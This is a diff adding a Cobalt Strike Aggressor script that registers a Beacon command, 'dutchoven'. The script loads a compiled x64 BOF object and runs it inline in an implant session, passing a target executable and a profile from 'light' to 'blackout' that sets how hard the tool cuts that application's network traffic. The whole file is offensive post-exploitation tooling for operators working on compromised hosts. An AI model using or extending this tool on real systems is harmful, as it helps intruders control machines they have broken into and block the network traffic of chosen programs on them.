@@ -1,0 +1,58 @@
+beacon_command_register(
+    "dutchoven",
+    "Apply a short application-scoped network brownout pulse",
+    "Usage: dutchoven <absolute.exe> [light|brownout|heavy|blackout]\n" .
+    "Example: dutchoven \"C:\\Path\\To\\Target.exe\" brownout"
+);
+
+alias dutchoven {
+    local('$arch $target $profile $profile_id $handle $object $packed');
+
+    # The COFF object is compiled for x64 and cannot be safely dispatched to an x86 Beacon.
+    $arch = barch($1);
+    if ($arch ne "x64") {
+        berror($1, "DutchOven currently supports x64 Beacon sessions only");
+        return;
+    }
+
+    $target = $2;
+    $profile = $3;
+    if ($target is $null) {
+        berror($1, "Usage: dutchoven <absolute.exe> [light|brownout|heavy|blackout]");
+        return;
+    }
+    if ($profile is $null) {
+        $profile = "brownout";
+    }
+
+    # Keep these numeric identifiers synchronized with DO_BOF_PROFILE_* in dutchoven_bof.c.
+    if ($profile eq "light") {
+        $profile_id = 0;
+    }
+    else if ($profile eq "brownout") {
+        $profile_id = 1;
+    }
+    else if ($profile eq "heavy") {
+        $profile_id = 2;
+    }
+    else if ($profile eq "blackout") {
+        $profile_id = 3;
+    }
+    else {
+        berror($1, "Profile must be light, brownout, heavy, or blackout");
+        return;
+    }
+
+    $handle = openf(script_resource("build/dutchoven.x64.o"));
+    if ($handle is $null) {
+        berror($1, "Unable to read build/dutchoven.x64.o; run make bof first");
+        return;
+    }
+    $object = readb($handle, -1);
+    closef($handle);
+
+    # "Zi" is a NUL-terminated UTF-16 string followed by a 32-bit integer.
+    $packed = bof_pack($1, "Zi", $target, $profile_id);
+    btask($1, "Tasked DutchOven " . $profile . " pulse for " . $target);
+    beacon_inline_execute($1, $object, "go", $packed);
+}
